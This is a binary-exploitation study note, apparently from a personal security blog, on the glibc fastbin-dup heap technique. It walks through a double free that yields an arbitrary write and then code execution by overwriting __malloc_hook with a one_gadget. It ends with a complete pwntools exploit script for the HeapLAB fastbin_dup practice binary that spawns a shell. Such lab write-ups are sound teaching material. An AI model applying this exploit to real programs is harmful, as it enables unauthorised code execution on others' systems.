---
title: "Fastbin Dupe"
tags: [Binary Exploitation, Heap]
excerpt: "Fastbin Dupe"
layout: single
classes: wide
--- 

Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist. This can be used to gain an arbitrary write primitive.

## Requirements
* Allocate chunks in fastbin size, `0x20 - 0x80`
* Ability to free chunks in any order
* Ability to forge or find fake chunk

## Process
### Arbitrary Write Primitive
_Assuming `target` is the address to be overwritten_
* Allocate 2 chunks, free them in alternating order: `free(1), free(0), free(1)`. This causes the `fd` pointer of the second chunk to link back to the first in the fastbin list.
* Forge a fake chunk somehow at `target - 16`, `target - 8` must hold chunk size equal to size of previous chunks.
* Allocate chunk, with `target - 16` as the data to overwrite the `fd` pointer in the fastbin list.
* Allocate 2 more chunks to free up fastbin list. Last address in the fastbin list will point to the fake chunk.
* Allocate chunk with data to be written to `target`.

### Gaining RCE using ret2libc
_This requires libc version to be known_
* Overwrite `__malloc_hook` using write primitive with `one_gadget`
    * Fake chunk can be found using `find_fake_fast &__malloc_hook` in `pwndbg`
    * Chunk size of all previous chunks must be same as chunk size in this fake chunk
    * As chunk is not allocated with alignment, data when overwriting becomes `padding + one_gadget`
* Call `malloc()`

## Example: HeapLAB fastbin_dup
```python
from pwn import *

config = {"elf" : "./fastbin_dup"}

def malloc(size, data):
    sla('> ', '1')
    sla('size: ', str(size))
    sla('data: ', data)

def free(index):
    sla('> ', '2')
    sla('index: ', str(index))

def exploit(p):
    # Get puts leak
    ru('puts() @ ')
    puts = int(p.recvline().strip(), 16)
    
    # Setting random username
    sla('username: ', 'JEFFJOHN')
    
    # Calculate libc addresses
    libc.address = puts - libc.symbols['puts']
    one_gadget = libc.address + 0xe1fa1
    malloc_hook = libc.symbols['__malloc_hook']
    
    # Fastbin dup
    malloc(0x68, "A"*8)
    malloc(0x68, "A"*8)

    free(1)
    free(0)
    free(1)

    # Overwrite __malloc_hook with one_gadget 
    fake_chunk = malloc_hook - 35
    malloc(0x68, p64(fake_chunk))
    malloc(0x68, "A"*8)
    malloc(0x68, "A"*8)
    malloc(0x68, "A"*19 + p64(one_gadget))

    # Pop shell
    sla('> ', '1')
    sla('size: ', '1')

    lg('Fake Chunk: ' + hex(fake_chunk))
    lg('malloc_hook: ' + hex(malloc_hook))
    lg('One_gadget: ' + hex(one_gadget))

    p.interactive()

if __name__ == "__main__":
    elf = context.binary = ELF(config["elf"])
    libc = elf.libc

    p = process(elf.path)
    pause()

    sl = lambda a: p.sendline(a)
    sla = lambda a,b: p.sendlineafter(a,b)
    ru = lambda a: p.recvuntil(a)
    lg = lambda a : log.info(a)

    exploit(p)
```
